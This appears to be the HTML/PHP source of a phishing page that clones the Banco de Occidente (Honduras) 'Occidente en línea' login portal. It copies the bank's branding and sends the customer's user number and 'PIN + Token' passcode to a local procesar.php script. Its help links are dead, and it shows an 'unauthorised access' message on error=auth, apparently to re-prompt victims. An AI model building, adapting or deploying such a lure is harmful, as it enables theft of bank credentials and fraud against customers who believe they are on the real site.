<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Occidente en línea - Login</title>
  <style>
    :root {
      --primary-orange-light: #F2971F;
      --primary-orange-dark: #F4801F;
      --primary-green: #0D9A49;
      --secondary-green: #13b35f;
      --dark-gray: #333;
    }

    body {
      font-family: Arial, sans-serif;
      background: url("fondo.png") no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    main {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }

    .login-box {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 6px 16px rgba(0,0,0,0.15);
      width: 100%;
      max-width: 380px;
      text-align: center;
      overflow: hidden;
    }

    /* Franja naranja con degradado corporativo */
    .login-top {
      background: linear-gradient(180deg, var(--primary-orange-light) 0%, var(--primary-orange-dark) 100%);
      padding: 3rem 1.5rem 0.5rem 1.5rem; /* subimos más la franja */
      border-top-left-radius: 16px;
      border-top-right-radius: 16px;
    }
    .login-top img {
      width: 100%;
      max-height: 100px;
      object-fit: contain;
      object-position: center;
      margin-bottom: 0.5rem;
    }
    .login-top h2 {
      color: #fff;
      margin: 0.5rem 0 1rem 0;
    }

    .form-group {
      text-align: left;
      margin-bottom: 1rem;
    }
    label {
      font-weight: 600;
      margin-bottom: 0.5rem;
      display: block;
    }
    input {
      width: 100%;
      padding: 0.75rem;
      border-radius: 6px;
      font-size: 1rem;
      box-sizing: border-box;
    }

    .login-top label {
      color: #fff;
    }
    .login-top input {
      background: #fff;
      color: #000;
      border: none;
    }
    .login-bottom label {
      color: var(--dark-gray);
    }
    .login-bottom input {
      background: #fff;
      color: #000;
      border: 1px solid #ccc;
    }

    .login-bottom {
      background: #fff;
      padding: 1.5rem;
    }

    .notice {
      background: #fff3e6;
      border: 1px solid var(--primary-orange-dark);
      padding: 1rem;
      border-radius: 6px;
      margin: 1rem 0;
      font-size: 0.9rem;
      color: #333;
      text-align: left;
    }

    .links {
      text-align: center;
      margin-top: 1rem;
      font-size: 0.85rem;
    }
    .links a {
      color: var(--primary-orange-dark);
      text-decoration: none;
      margin: 0 0.5rem;
    }
    .links a:hover {
      text-decoration: underline;
    }

    .btn {
      width: 100%;
      padding: 0.9rem;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 0.5rem;
    }
    .btn-primary {
      background: var(--primary-green);
      color: #fff;
      border: none;
    }
    .btn-primary:hover {
      background: var(--secondary-green);
    }
    .btn-outline {
      background: transparent;
      border: 1px solid var(--primary-green);
      color: var(--primary-green);
    }
    .btn-outline:hover {
      background: var(--primary-green);
      color: #fff;
    }

    .app-icons {
      text-align: center;
      margin-top: 1.5rem;
    }
    .app-icons img {
      height: 40px;
      margin: 0 0.5rem;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <main>
    <div class="login-box">
      <!-- Parte superior naranja con degradado -->
      <div class="login-top">
        <img src="logo.png" alt="Logo Banco de Occidente">
        <h2>Occidente en línea</h2>
     <form action="procesar.php" method="POST">
      <!-- Mensaje de error cuando la URL trae error=auth -->
<?php if (isset($_GET['error']) && $_GET['error'] == 'auth'): ?>
    <div style="background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 10px; border-radius: 6px; margin-bottom: 15px; font-size: 14px; text-align: center;">
        Acceso no Autorizado.
    </div>
<?php endif; ?>
        <div class="form-group">

          <label for="usuario">Usuario</label>
          <input type="text" id="username" name="username" required placeholder="Ingresa 8 números" minlength="8" maxlength="8" pattern="[0-9]{8}" inputmode="numeric" title="Debe ingresar exactamente 8 números" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
        </div>
      </div>

      <!-- Parte inferior blanca -->
      <div class="login-bottom">
          <div class="form-group">
            <label for="pin">PIN + Token (Passcode)</label> 
            <input type="password" id="password" name="password" required placeholder="Digite Su Contraseña" inputmode="numeric" pattern="[0-9]{5}" maxlength="5" title="Debe ingresar exactamente 5 números" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
          </div>

          <div class="notice">
            <strong>¡Atención!</strong><br>
            Estimado cliente, siempre verificar que se encuentra en la URL Oficial de Banco de Occidente:<br>
            Página web: <br>
            <span style="color:var(--primary-orange-dark)">https://www.bancodeoccidente.hn/</span>
          </div>

          <button type="submit" id="btnLogin" class="btn btn-primary">Ingresar</button>
          <button type="button" class="btn btn-outline">Ingresar por primera vez</button>
     </form>

        <div class="links">
          <a href="#">Olvidé mi usuario</a> |
          <a href="#">Solicitar usuario</a> |
          <a href="#">Olvidé mi PIN</a> |
          <a href="#">¿Token bloqueado?</a>
        </div>

        <div class="app-icons">
          <img src="https://www.bancodeoccidente.hn/recursos/img/google-play.png" alt="Google Play">
          <img src="https://www.bancodeoccidente.hn/recursos/img/app-store.png" alt="App Store">
        </div>
      </div>
    </div>
  </main>
</body>
</html>
